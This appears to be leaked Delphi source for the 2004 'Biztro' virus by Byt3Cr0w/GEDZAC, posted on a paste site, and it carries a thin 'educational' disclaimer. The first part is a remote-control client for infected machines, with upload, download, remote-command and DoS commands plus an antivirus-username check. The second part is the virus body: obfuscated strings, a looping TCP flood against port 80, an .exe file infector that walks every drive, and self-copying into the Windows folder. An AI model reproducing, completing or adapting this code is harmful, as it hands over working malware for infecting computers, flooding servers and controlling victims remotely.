       sin_addr.S_addr := Inet_Addr(pchar(m));
     end;
     if not Connect(Zock,direcx,SizeOf(direcx)) = 0 then Result := false else Result := true;
   Sendx('P'+sp);
    if packet('1') then Result:=true else begin Result := false; CloseSocket(Zock); end;
   end;

   function RemoteBioSetup:string;
   var bag :array [0..2048] of char;
   begin
   Sendx('Sta'+sp);
   Recv(Zock,bag,SizeOf(bag),0);
   Result := Copy(bag,1,300);
   end;

   function ip:string;
   var somedata:TWSAData;
   begin
       WSAStartup(257,somedata);
       Result := Inet_ntoa(pinaddr(GetHostByName(nil)^.h_addr_list^ )^);
       WSACleanup;
   end;

   function MakeD(x:string):string;
   var i:integer;
       s,m,from:string;
       begin
   m := x;
   Delete(m,1,3);

   from := m;
   for i:= 1 to Length(m) do if m[i] <> #32 then s:=s+m[i] else s:=s+'+';
   m := Copy(s,1,3);
   Delete(s,1,3);
   s := 'Biz0'+m+s;
   Result := s;
   end;


   procedure TSplash.Local(const m:string;const e:integer);
   var i:integer;
   begin
   case e of
   1: begin
   GroupBox3.Hide;
   Image9.Hide;
   GroupBox6.Show;
   Splash.Update;
   for i := 0 to 113 do begin sleep(10); GroupBox6.Height := 0+i; Splash.Update; end;i:=0;
   Splash.Update;
   Label6.Caption := 'From: '+m;
   Label7.Caption := 'to: '+rip;
   Label8.Caption := 'Status: Transfering...';
   Splash.Update;
   end;
   2: begin
   Label8.Caption := 'Status: Done';
   Splash.Update;
   sleep(800);
   for i := 0 to 113 do begin sleep(10); GroupBox6.Height := 113-i; Splash.Update; end;i:=0;
   Splash.Update;
   GroupBox3.Show;
   GroupBox6.Hide;
   end;
   3:begin
   GroupBox3.Hide;
   Image9.Hide;
   GroupBox6.Show;
   Splash.Update;
   for i := 0 to 113 do begin sleep(10); GroupBox6.Height := 0+i; Splash.Update; end;i:=0;
   Label6.Caption := 'From: http://'+ip+':2777/'+m;
   Label7.Caption := 'to: '+rip;
   Label8.Caption := 'Status: Downloading...';
   Splash.Update;
   end;
   end;
   end;

   procedure Tsplash.Download(const x1:string);
   var i:integer;
       ram,k,ex,m,x:string;
   begin
   Randomize;
   m := x1;
   Delete(m,1,9);
   k := m;
   for i := 1 to Length(m) do if m[i] = #32 then m:=MakeD(k);i:=0;
   for i := Length(m) downto 0 do ex:=ex+m[i]; i:=0;
   for i := 1 to Length(ex) do if ex[i] <> '.' then x:=x+ex[i] else break;i:=0;ex:='';
   for i := Length(x) downto 0 do ex:=ex+x[i]; i:=0;
   ram := 'C:\BiztroDownload'+IntToStr(Random(999999))+'.'+ex;
   Memo2.Text := Memo2.Text + 'Downloading file from: http://'+rip+':2888/'+m+sp;
   Local(m,3);
   Splash.Update;
   UrlDownLoadToFile(nil,PchaR('http://'+rip+':666/'+m),Pchar(ram),0,nil);
   Memo2.Text := Memo2.Text + 'Downloaded file in: '+ram+sp;
   Local(m,2);
   end;

   procedure Tsplash.Upload2(const x:string);
   var m,re:string;
   bag :array [0..2048] of char;
   o:integer;
   label u;
   label k;
   begin
   m:=x;
   Delete(m,1,9);
   if Pos('exupload localhost/',x) > 0 then goto u;
   goto k;
   u:
   CreateThread(nil,0,@Server,nil,0,ID);
   Delete(m,1,10);
   m := 'http://'+ip+':2777/'+m;
   o:=1;
   k:
   Memo2.Text := Memo2.Text + 'Sending upload command...'+sp;
   if o = 1 then Local(m,1);
   Sendx('/+\'+m+sp);
   Memo2.Text := Memo2.Text + 'Waiting for reply...'+sp;
   Recv(Zock,bag,SizeOf(bag),0);
   re:=Copy(bag,1,300);
   if Pos('B1',re) > 0 then if Pos('B1*',re) > 0 then Memo2.Text := Memo2.Text + 'Biztro can not upload the file.'+sp else begin Delete(re,1,2); Memo2.Text := Memo2.Text + 'Uploaded file in: '+re+sp;
   if o=1 then  Local(m,2);
   m:=''; e:=0;
   end;
   end;

   procedure Tsplash.Upload(const x:string);
   var m,re:string;
   bag :array [0..2048] of char;
   o:integer;
   label u;
   label k;
   begin
   m:=x;
   Delete(m,1,7);
   if Pos('upload localhost/',x) > 0 then goto u;
   goto k;
   u:
   Delete(m,1,10);
   CreateThread(nil,0,@Server,nil,0,ID);
   m := 'http://'+ip+':2777/'+m;
   o:=1;
   k:
   Memo2.Text := Memo2.Text + 'Sending upload command...'+sp;
   if o = 1 then Local(m,1);
   Sendx('/*\'+m+sp);
   Memo2.Text := Memo2.Text + 'Waiting for reply...'+sp;
   Recv(Zock,bag,SizeOf(bag),0);
   re:=Copy(bag,1,300);
   if Pos('B1',re) > 0 then if Pos('B1*',re) > 0 then Memo2.Text := Memo2.Text + 'Biztro can not upload the file.'+sp else begin Delete(re,1,2); Memo2.Text := Memo2.Text + 'Uploaded file in: '+re+sp;
   if o=1 then  Local(m,2);
   m:=''; e:=0;
   end;
   end;


   procedure  TSplash.SendPlugin(const x:string);
   var m:string;
   begin
   m:=x;
   Delete(m,1,7);
   Sendx('/0\'+m+sp);
   Memo2.Text := Memo2.Text + 'The remote plugin url was sended.'+sp;
   end;

   function MakeDownFile(m:string):boolean;
   begin
   Sendx('MID'+m+sp);
   if not packet('D1') then Result := false else Result := true;
   end;


   procedure TSplash.BioChange(const m:string;const e:integer);
   var t:string;
       i:integer;
   label fin;
   begin
   if e=1 then t := '<I>'; if e=2 then t := '<E>'; if e=3 then t := '<T>';
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 409+i; Splash.Update; end;
   e2:=1;
   sleep(500);
   Splash.Update;
   SpeedButton7.Caption := 'Sending new settings...';
   Memo2.Text := Memo2.Text + 'Sending new settings...'+sp;
   Splash.Cursor := crHourGlass;
   SpeedButton7.Cursor := crNo;
   ProgressBar3.StepIt;
   ProgressBar3.Show;
   Splash.Update;
   Sendx(t+m+sp);
   sleep(1000);
   SpeedButton7.Caption := 'Waiting for reply...';
   Memo2.Text := Memo2.Text + 'Waiting for reply...'+sp;
   ProgressBar3.StepIt;
   Splash.Update;
   sleep(1000);
   if not packet('E1') then begin Error(1); exit; goto fin; end;
   Splash.Update;
   SpeedButton7.Caption := 'Done';
   Memo2.Text := Memo2.Text + 'The remote Bio Setup was changed'+sp;
   fin:
   SpeedButton7.Cursor := crDefault;
   Splash.Cursor := crDefault;
   ProgressBar3.StepIt;
   Splash.Update;
   Sleep(800);
   SpeedButton7.Caption := '';
   Splash.Update;
   if e2 = 1 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 409-i; Splash.Update; end;
   e2:=0;
   end;
   SpeedButton7.Caption := 'Change';
   ComboBox1.Text := 'Options';
   Edit3.Text := 'Select an Option';
   Edit3.Enabled := false;
   e1:=0;
   ProgressBar3.Hide;
   Splash.Update;
   end;

   procedure TSplash.SendComm(m:string);
   var bag:array [0..100] of char;
    a,b,c,d,ram:string;
    k:textfile;
    begin
   Randomize;
   ram := 'C:\BiztroDat'+IntToStr(Random(999999))+'.txt';
   b:=m;
   If Pos('/echo',b) > 0 then begin Memo2.Text := Memo2.Text + 'The ECHO Command is not allowed.'+sp; exit; end;
   If Pos('/@echo',b) > 0 then begin Memo2.Text := Memo2.Text + 'The ECHO Command is not allowed.'+sp; exit; end;
   Delete(b,1,1);
   Sendx('BXC'+b+sp);
   Recv(Zock,bag,SizeOf(bag),0);
   a := Copy(bag,1,100);
   UrlDownLoadToFile(nil,PchaR('http://'+rip+':666/'+a),Pchar(ram),0,nil);
   try
   assignfile(k,ram);
   reset(k);
   while not eof(k) do begin
   Readln(k,c);
   d:=d+c+sp;
   end;
   Memo2.Text := Memo2.Text +sp+d+sp;
   CloseSOcket(Zock);
   closefile(k);
   Erase(k);
   if not connectx(rip) then Error(2);
   except end;
   end;


   function CheckHealth:boolean;
   begin result := true; end;

   function CheckRAM:boolean;
   var RAM:TMemoryStatus;
   begin
   RAM.dwLength := sizeof(RAM);
   GlobalMemoryStatus(RAM);
   with RAM do if dwMemoryLoad > 95 then Result := false else Result := true;
   end;

   function CheckUser:boolean;
   var s: dword;
   c:array[0..255] of char;
   user:string;
   begin
   s := 256;
   if GetUserName(c,s) then user:=c else begin Result := false; exit; end;
   if (Pos('Antivirus',user)>0) or (Pos('PER An',user)>0) or (Pos('Panda An',user)>0) or (Pos('Norman An',user)>0) or (Pos('Symantec',user)>0) then Result := false;
   end;



   function CheckISP:boolean;
   begin
    Result := InternetGetConnectedState(nil, 0);
   end;


   procedure TSplash.Pro;
   var R: TRect;
   begin
         Memo1.Visible := true;
         ProgressBar1.Visible := true;
         Splash.Update;
   if control1 = 1 then exit;
   control1 := 1;
   e:=0;e1:=0;e2:=0;
   Memo1.Lines.Add('Loading...');
   Memo1.Lines.Add('Checking integrity...');
   ProgressBar1.StepIt;
   Splash.Update;
   sleep(500);
   if CheckHealth then Memo1.Lines.Add('Integrity OK') else begin Msgx('Error: Wrong Integrity - Please install again.'); exitprocess(0); end;
   Memo1.Lines.Add('Checking space in RAM...');
   ProgressBar1.StepIt;
   Splash.Update;
   sleep(500);
   if CheckRAM then Memo1.Lines.Add('Space in RAM OK') else begin Msgx('Error: BCC need more RAM - Please free some space in memory.'); exitprocess(0); end;
   Memo1.Lines.Add('Checking Local machine...');
   ProgressBar1.StepIt;
   Memo1.Visible := true;
   Splash.Update;
   sleep(500);
   if CheckUser then Memo1.Lines.Add('Local machine OK') else begin Msgx('Error: For security reasons BCC can not run in this machine - Please remove this program from your HD.'); exitprocess(0); end;
   Memo1.Lines.Add('Checking for Internet...');
   ProgressBar1.StepIt;
   Splash.Update;
   sleep(500);
   if CheckISP then Memo1.Lines.Add('Internet is OK') else begin Msgx('Error: BCC need internet service - Please connect to internet'); exitprocess(0); end;
   Splash.Update;
   sleep(800);
   SystemParametersInfo(SPI_GETWORKAREA, 0, @R, 0);
      SetBounds(R.Left, R.Top, R.Right-R.Left, R.Bottom-R.Top);
      ProgresSBar1.Destroy;
      Image1.Destroy;
      Image2.Destroy;
      Image3.Destroy;
      Memo1.Destroy;
      Label2.Destroy;
      Label3.Destroy;
      SpeedButton2.Destroy;
      GroupBox1.Destroy;
   Image4.Visible := true;
   Image5.Visible := true;
   Image6.Visible := true;
   Image7.Visible := true;
   Image9.Visible := true;
   Image10.Visible := true;
   GroupBox2.Visible := true;

    PostMessage(ProgressBar2.Handle, $0409, 0,$00804000);
    PostMessage(ProgressBar3.Handle, $0409, 0,$00804000);
   Splash.BorderStyle := bsSingle;

      end;



   procedure TSplash.SpeedButton2Click(Sender: TObject);
   begin
   Pro;
   end;




   procedure TSplash.Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.SpeedButton1MouseMove(Sender: TObject;
     Shift: TShiftState; X, Y: Integer);
   begin
   SpeedButton1.Font.Color := $009F5000;
   end;

   procedure TSplash.Memo2MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.GroupBox2MouseMove(Sender: TObject; Shift: TShiftState;
     X, Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.FormMouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;

   procedure TSplash.Image6MouseMove(Sender: TObject; Shift: TShiftState; X,
     Y: Integer);
   begin
   SpeedButton1.Font.Color := $00C08000;
   end;


   procedure TSplash.ConProg;
   begin
   NowCon := true;
   ProgressBar2.Show;
   Label5.Caption := 'Status: Connecting to '+Edit2.Text;
   Memo2.Text := Memo2.Text + 'Connecting to '+Edit2.Text+'...'+sp;
   Splash.Update;
   SpeedButton3.Caption := 'Connecting...';
   SpeedButton5.Enabled := true;
   Splash.Update;
   if not Connectx(Edit2.Text) then
   begin
   SpeedButton3.Caption := 'Connect';
   Label5.Caption := 'Status: Connection failed.';
   Memo2.Text := Memo2.Text + 'Connection failed.'+sp;
   Error(1);
   Splash.Update;
   exit;
   end;
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   SpeedButton3.Caption := 'Connected';
   Label5.Caption := 'Status: Connected to '+Edit2.Text;
   Memo2.Text := Memo2.Text + 'Connected to '+Edit2.Text+sp;
   SpeedButton3.Caption := 'Connect';
   ProgressBar2.Hide;
   Splash.Update;
   GroupBox3.Show;
   Image9.Hide;
   Memo3.Text := RemoteBioSetup;
   rip := Edit2.Text;
   end;

   procedure TSplash.SpeedButton3Click(Sender: TObject);
   begin
   ConProg;
   end;

   procedure TSplash.SpeedButton5Click(Sender: TObject);
   begin
   if not NowCon then exit;
   SpeedButton5.Caption := 'Disconnecting';
   Label5.Caption := 'Status: Disconnecting from '+rip;
   Splash.Update;
   ProgressBar2.StepIt;
   ProgressBar2.Show;
   Splash.Update;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   ProgressBar2.StepIt;
   sleep(500);
   CloseSocket(Zock);
   GroupBox3.Hide;
   Image9.Show;
   SpeedButton5.Caption := 'Disconnect';
   Label5.Caption := 'Status: Disconnected';
   Splash.Update;
   ProgressBar2.Hide;
   NowCon := false;
   end;



   procedure TSplash.SpeedButton6Click(Sender: TObject);
   begin
   Image9.Visible := false;
   Image8.Visible := false;
   Label1.Left := 100;
   Label1.Caption := 'Biztro IP List';
   GroupBox3.Visible := true;
   if not fileexists('list.ini') then Memo3.Text := 'The IP list is emty.' else Memo3.Lines.LoadFromFile('list.ini');
   end;

   procedure TSplash.SpeedButton4Click(Sender: TObject);
   var a:textfile;
   begin
   if Edit2.Text = '' then begin Msgx('Please put a valid IP Address'); exit; end;
   AssignFile(a,'list.ini');
   if not fileexists('list.ini') then rewrite(a) else append(a);
   writeln(a,Edit2.Text); closefile(a);
   Msgx(Edit2.Text+' was added to the IP List');

   end;

   procedure TSplash.Image8Click(Sender: TObject);
   var i:integer;
   begin
   if e = 0 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 361+i; Splash.Update; e:=1;  end;
   exit;
   end;
   if e = 1 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 385-i; Splash.Update; e:=0; end;
   e1:=0;
   exit;
   end;
   end;

   procedure TSplash.ComboBox1Change(Sender: TObject);
   begin
   if ComboBox1.Text <> 'Options' then Edit3.Enabled := true else Edit3.Enabled := false;
   if ComboBox1.Text = 'Re-Infection Day' then Edit3.Text := '15';
   if ComboBox1.Text = 'Cmd Status' then Edit3.Text := 'Enable';
   if ComboBox1.Text = 'Max Threads' then Edit3.Text := '26';

   end;

   procedure TSplash.Edit3Change(Sender: TObject);
   var i:integer;
   begin
   if Edit3.Text <> '' then if e1=0 then begin
   for i := 1 to 24 do begin sleep(50); GroupBox3.Height := 385+i; Splash.Update; end;
   e1:=1;
   exit;
   end;
   end;

   procedure TSplash.SpeedButton7Click(Sender: TObject);
   var a:integer;
       b:string;
   begin
   b:=''; a:=0;
   b:= LowerCase(Edit3.Text);
   if ComboBox1.Text = 'Re-Infection Day' then
   try a:=StrToInt(Edit3.Text); except MsgX('Error: The Re-Infection date must be a valid number.'); exit; end;
   if ComboBox1.Text = 'Cmd Status' then
   if b<>'enable' then if b<>'disable' then begin MsgX('Error: The Cmd Status must be one of these:'+sp+' -Enable'+sp+' -Disable'); exit; end;
   if ComboBox1.Text = 'Max Threads' then
   try a:=StrToInt(Edit3.Text); except MsgX('Error: The Max Threads must be a valid number.'); exit; end;
   /////////////**** If we are on these point that means = Everything is OK  ****/////////
   if ComboBox1.Text = 'Re-Infection Day' then BioChange(b,1);
   if ComboBox1.Text = 'Cmd Status' then BioChange(b,2);
   if ComboBox1.Text = 'Max Threads' then BioChange(b,3);
   end;

   procedure TSplash.Sund;
   var a,b:string;
   label go;
   begin
   a := LowerCase(Edit1.Text);
   b:=a;
   Delete(b,1,4);
   if Pos('upload',a)>0 then goto go;
   if Pos('uploadex',a)>0 then goto go;
   if Pos('download',a)>0 then goto go;
   if Pos('dos',a)>0 then goto go;
   if Pos('dosx',a)>0 then goto go;
   if Pos('plugin',a)>0 then goto go;
   if Pos('/',a)>0 then goto go;
   error(2);
   exit;
   go:
   If Pos('/',a)>0 then begin SendComm(a); exit; end;
   If Pos('ex',a)>0 then begin Upload2(a); exit; end;
   If Pos('up',a)>0 then Upload(a);
   If Pos('download',a)>0 then download(a);
   If Pos('dos',a)>0 then begin Sendx('D*Z'+b+sp); Memo2.Text:=Memo2.Text +sp+'The Dos request was sended'+sp; Splash.Update; closesocket(Zock); Memo2.Text := Memo2.Text + 'Biztro is now totally dedicated to the DoS Attack, you have to wait for the Restart of the Remote machine to be able to connect again to '+rip+sp; Disconnect; end;
   If Pos('plugin',a)>0 then SendPlugin(a);
   end;

   procedure TSplash.SpeedButton1Click(Sender: TObject);
   begin
   Sund;
   Edit1.Clear;
   end;

   procedure TSplash.SpeedButton12Click(Sender: TObject);
   begin
   Memo2.Text := Memo2.Text + Comlist;
   end;

   procedure TSplash.SpeedButton9Click(Sender: TObject);
   begin
   Memo2.Clear;
   Memo2.Text := COMLIST;
   end;


   procedure TSplash.SpeedButton11Click(Sender: TObject);
   begin
   ShellExecute(0,nil,pchar('http://www.gedzac.tk'),'','',SW_SHOWNORMAL);
   end;

   procedure About;
   begin
   MsgX('Biztro Control Client - Coded & Designed by Byt3Cr0w/GEDZAC'+sp+'Greedz/Thnx to:'+sp+' - All Gedzac Members'+sp+' - Falckon/DCA'+sp+' - BlackRose =)'+sp+' - Sickbyte & Backus from PrimateLost'+sp+'And all the ppl that i forget...:)'+sp+'http://www.gedzac.tk');
   end;

   procedure TSplash.SpeedButton10Click(Sender: TObject);
   begin
   About;
   end;

   procedure TSplash.SpeedButton8Click(Sender: TObject);
   begin
   ShellExecute(0,nil,pchar('mailto:byt3cr0w@gedzac.zzn.com'),'','',SW_SHOWNORMAL);
   end;

   procedure TSplash.Edit1KeyDown(Sender: TObject; var Key: Word;
     Shift: TShiftState);
   begin
   if Key = VK_Return then begin Sund; Edit1.Clear; end;
   end;

   procedure TSplash.SpeedButton13Click(Sender: TObject);
   begin
   Memo2.Clear;
   end;

   procedure TSplash.FormClose(Sender: TObject; var Action: TCloseAction);
   begin
   About;
   end;

   procedure TSplash.Image9Click(Sender: TObject);
   begin
   ShellExecute(0,nil,pchar('http://www.gedzac.tk'),'','',SW_SHOWNORMAL);
   end;

   procedure TSplash.FormCreate(Sender: TObject);
   var bit:integer;
   begin
   Bit := Application.MessageBox ('Español: Al oprimir el botón SI/YES TU te estas haciendo responsable de todos'+sp+'los daños ocasionados por el uso indebido de este programa.'+sp+sp+'English: If you press the YES button YOU will have all the Responsibility of the illegal use of this program.'+sp+sp+'Byt3Cr0w/GEDZAC','Biztro Control Client',MB_YESNO+MB_ICONINFORMATION);
      If Bit = ID_NO Then
      begin
      About;
      exitprocess(0);
     end;

   end;

   procedure TSplash.Edit2KeyDown(Sender: TObject; var Key: Word;
     Shift: TShiftState);
   begin
   if Key = VK_Return then ConProg;
   end;

   end."
LzhCd2QV,Biztro.code.dpr,FlyFar,Delphi,Wednesday 7th of June 2023 05:33:37 AM CDT,"     { well first see what i do in my sad times... he... }
   {   *Biztro*

   See the sky
   well now it is a little bit dark
   just like your eyes...
   smell the air...
   forget the pain...

   Make me forget
   make me wish
   can you make me dream?
   teach to me please...

   Where you come from?
   from my mind?
   are you behind my eyes?
   or you just look me behind
   that very dark glass?

   See my face, can you see
   all the pain?
   can you feel that in the air?
   can you see what i wish?
   The reason why I am here?

   Keep this secret with you
   run...
   just run...
   forget me..
   i never exists...
   i never say this...
   i don't belong here...
   }
   {Byt3Cr0w/GEDZAC 2004 (C)}
   {------------------------------------}
   { Biztro Virus - designed & coded by Byt3Cr0w/GEDZAC }
   { Started: 23/10/2004 - Finish: 9/11/2004 }
   { Dedicated to: All Gedzac members - Falckon (hey Bro!) - & - BlackRose (hi sister! :))}
   { I make this program/virus just for educational porpouses }
   { I don't spread this program/virus and i will never do that }
   { Use this code just for education & fun! }
   { If you make some changes or spread this program/virus you will be responsible! }
   { Important: the author is not responsible for any damage that occurred from the use of this program. }
   { if you are not agree with this terms then please erase this sourcecode from your Hard Disk. }
   {Warning: This is a BETA version so maybe you will find some errors... }
   {if you find bugs or errors please send me an email and i will fix that...
   { email: byt3cr0w@gedzac.zzn.com }
   {---------------Have Fun!-------------}


   program Biztro;
   uses
     Windows,
     WinSock,
     SysUtils,URLMON,ShellApi;
   const SP = #13#10; BufX = 2000; virussize=30208;
         d0z = 'žš¸PN”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎN~vz`~`tvr~z`~|vzxt~|z~|z`~|zvt|zx|zvt~|zv~xp|z~vr|zrbx~z|~z|rx~z||Nbv`pp'+
               'p~`vx|xp`~z~xz`~z~pp~rz~r|zr|zrb|zrpbz|pzpN”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ`~v~v~v`~xvt~|xvt~x|vt~|”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎp`~xvvt~|x~vtr|x~vtr|x|vtxNbvt`x`tvr”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”Â'+
               'äøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎ”ÂäøôÎpppppNppppppppppppppppppppppppppppppppppppppp´ÚöðÚÖø¸ÀÚ–ÎØÂÌÞ’ôøppppppppppppppppppppppppppp'+
               'ppppppppppppppppppppppppppppNNNNNNNLLLLLLLLLLLNNNNNLLNNNLLLLLLLLLLLLLLNNNNNNNNNNNNNNNNNNNNNNNLLLLLLNNNNNNNNLLLNNLLNNLNNNNNNNNNLLLLNNNNNLLNLNLNN';
   //Thnx To Sickbyte/Primatelost for the Flood Idea//
   var x,OhRead,OhWrite,CTS,me,current,oupz:integer; shutdownx: Boolean = False;
   j,RID,RSS,IT,CP,filename,exec_lines,about,doztar: string;ID:dword;
   f1,f2:file;silence:word;
   bufete:array[1..virussize] of char;
   clock:TSystemTime;

   procedure sendback(const delivery:string );
   begin
   send(x,pointer(delivery)^,length(delivery),0);
   end;

   function winpath:String;
   var winfol:pchar;
   WTama : dword;
   begin
   WTama := MAX_PATH + 1;
   GetMem( winfol, WTama );
   try
   if Windows.GetWindowsDirectory( winfol, WTama ) <> 0 then
   Result := winfol;
   finally
   FreeMem(winfol);
   end;
   end;

   function Petition(m:integer):boolean;
   begin
   CTS := 1;
   IT := '100';
   try
   if m = 1 then begin
   if CTS >= StrToInt(IT) then Result:=False{Reject New Thread Petition} else
   begin
   Result:=true; {Accept New thread Petition}
   Inc(CTS);
   end;
   end;
   except Result := true; exit; end;
   if m = 2 then CTS := CTS - 1;
   end;


   Function d(things:string):string;
   var newx,s:string;
       LlL,OoO,o,r:integer;
   begin
   o := strlen(pchar(things));
   For r := 1 to o do begin
   s := s + chr(ord(things[r]) div 2)
   end;
   LlL := strLen(PChar(s));
   For OoO := 1 to LlL do begin
   newx := newx + chr(ord(s[OoO]) xor 8);
   end;
   Result := newx;
   end;

   procedure D0zIt;
   var sadd:TSockAddr;D0zDat:TWSAData;D0zSock:TSocket;
   label gogogo;
   begin
    WSAStartup($101,D0zDat);
     D0zSock := Socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
     if D0zSock = INVALID_SOCKET then exit;
     with sadd do begin
       sin_family := AF_INET;
       sin_port := htons(80);
       sin_addr.S_addr := Inet_Addr(pchar(doztar));
     end;
     if not Connect(D0zSock,sadd,SizeOf(sadd)) = 0 then exit;
     gogogo:
     Send(D0zSock,pointer(d(d0z)+sp)^,length(d(d0z)+sp),0);
     goto gogogo;
   end;

   procedure bye(Sock:Integer);
   begin
     ShutDown(Sock,2);
     CloseSocket(Sock);
   end;


   procedure Doz(m:string);
   var x1:string;
       e:integer;
   begin
   if doztar <> '' then exit;
   shutdownx := true;
   Bye(x);
   x1:=m;
   Delete(x1,1,3);
   doztar:=x1;
   CreateThread(nil,0,@D0zIt,nil,0,ID); //We don't care the Max. Threads...we create one thread for the D0z
   for e:= 1 to 5 do if Petition(1) then CreateThread(nil,0,@D0zIt,nil,0,ID);
   //We Make some petitions for create 5 more Threads...
   end;


   function cutwin:string;
   var i:integer;s,x:string;
   begin
   for i := Length(winpath) downto 0 do s :=s+winpath[i]; i:=0;
   for i := 0 to Length(s) do if s[i] <> d('¨') then Result := Result + s[i] else break; i:=0;
   for i := Length(Result) downto 0 do x:=x+Result[i]; i:=0;Result := x;
   end;

   function OwnedCell(CellTarget:string):boolean;
   var Buff3:array[1..VirusSize] of Char;
   P4m,Eip:file;
   p0p,pu5h,iox:integer;
   BioCell:string;
   begin
   filemode:=2;
   {$I-}
   AssignFile(Eip,CellTarget); Reset(Eip, 1); CloseFile(Eip);
   {$I+}
   iox := IOResult; FileMode := 0 ;
   if iox = 0 then begin
   AssignFile(P4m,CellTarget);
   reset(P4m,1); Seek(P4m,FileSize(P4m)-6); BlockRead(P4m,Buff3,sizeof(Buff3),pu5h);
   For p0p := 1 to sizeof(Buff3) do BioCell := BioCell + Buff3[p0p];
   if Pchar(BioCell) = d('”ÂäøôŽ') then result :=true else Result :=false;
   closefile(P4m);
   end else Result := false;
   end;

   Procedure OwnCell(Prozak2S:String);
   Var
    Prozak1S,ZXC1:String;
    Prozak1,Prozak2,ProzakGedzac1:File;
    GEDZAC,GROUP:Integer;
    Buf: array[1..2048] of Char;
   Begin
    if OwnedCell(Prozak2S) = false then
    begin
    Prozak1S:=winpath+d('¸ÚÊð¨”ÂäøôÎLÚàÚ');
    CopyFile(pchar(ParamStr(0)),Pchar(Prozak1S), FALSE);
    ZXC1:=Prozak2S+d('LøÊð'); FileMode:=0;
    AssignFile(Prozak1, Prozak1S); Reset(Prozak1,1);
    AssignFile(Prozak2, Prozak2S); Reset(Prozak2,1);
    AssignFile(ProzakGedzac1, ZXC1); Rewrite(ProzakGedzac1, 1);
    Repeat
   BlockRead(Prozak1, Buf, SizeOf(Buf), GEDZAC); BlockWrite(ProzakGedzac1, Buf, GEDZAC, GROUP);
    Until (GEDZAC = 0) or (GROUP <> GEDZAC);
    Repeat
   BlockRead(Prozak2, Buf, SizeOf(Buf), GEDZAC); BlockWrite(ProzakGedzac1, Buf, GEDZAC, GROUP);
    Until (GEDZAC = 0) or (GROUP <> GEDZAC);
    BlockWrite(ProzakGedzac1,'BiztrO',6); CloseFile(ProzakGedzac1);
    CloseFile(Prozak1); CloseFile(Prozak2);
    CopyFile(Pchar(ZXC1),Pchar(Prozak2S), FALSE); DeleteFile(Pchar(ZXC1));
   End; End;

   procedure Scan(folder:Ansistring);
   var buscame  : TSearchRec;
       encontrado    : String;
       anne : Integer;
       tipo:AnsiString;
   begin
   silence := SetErrorMode(SEM_FailCriticalErrors);
   Tipo := d('DLÚàÚ');
      if folder[Length(folder)] <> d('¨') then folder := folder +d('¨');
      anne := FindFirst(folder + d('DLD'), faAnyfile,buscame); while anne = 0 do
       begin
         if (buscame.name <> '.') and (buscame.name <> '..') and (buscame.name <> cutwin) then
           if buscame.Attr and faDirectory > 0 then
           begin

           Scan(folder+buscame.Name);
           end;
         anne := FindNext(buscame);
       end;
      if folder[Length(folder)] <> '\' then folder := folder + '\';
      anne := FindFirst(folder+tipo, faAnyFile - faDirectory,buscame);
      while anne = 0 do
       begin
         if(buscame.name <> '.') and (buscame.name <> '..') and (buscame.name <> '')
            then begin
                  encontrado := folder + buscame.name;
              OwnCell(encontrado);

                 end;
         anne := FindNext(buscame);
       end;
   end;


   function ScanCells:integer;
   var A:char;
   begin
   silence := SetErrorMode(SEM_FailCriticalErrors);
   for A := 'A' to 'Z' do if fileexists(A+d('d¨Œºˆˆ')) then Scan(A+d('d¨'));
   Petition(2);
   end;

   procedure InfectCenter;
   var A:char;
   begin
   silence := SetErrorMode(SEM_FailCriticalErrors);
   if Petition(1) then CreateThread(nil,0,@ScanCells,nil,0,ID) else
   begin
   for A := 'A' to 'Z' do if fileexists(A+d('d¨Œºˆˆ')) then Scan(A+d('d¨'));
   Petition(2);
   end;
   end;


   procedure aislamiento(const m:integer);
   var i,b:integer;
   Ou: TProcessInformation;
   Uo: TStartupInfo;
   begin
   FillChar(Ou, sizeof(TProcessInformation), 0);
   FillChar(Uo, sizeof(TStartupInfo), 0);
   Uo.cb := sizeof(TStartupInfo);
   Randomize;
   if not DirectoryExists(d('–d¨¾‚Œ˜Ž¾¶¨œŽŒ¸¶¨œÎÌøöœÂÈÚö¨')) then CreateDirectory(Pchar(d('–d¨¾‚Œ˜Ž¾¶¨œŽŒ¸¶¨œÎÌøöœÂÈÚö¨')),nil);
   b := Random(StrToInt(d('bbbbb')));
   FILENAME := winpath+d('¨œÎÌøö¨œÎÌøöœÂÈÚö')+InttoStr(b)+d('LÚàÚ');
   if m = 1 then begin if DirectoryExists(winpath+d('¨œÎÌøö¨')) then Filename := winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ') else begin createdirectory(Pchar(winpath+d('¨œÎÌøö¨')),nil); Filename := winpath+d('¨œÎÌøö¨¶ÚôüÂÖÚLÚàÚ'); end;
   if m = 2 then Filename := winpath+d('¸ÚÊð¨”ÂäøôÎLÚàÚ');
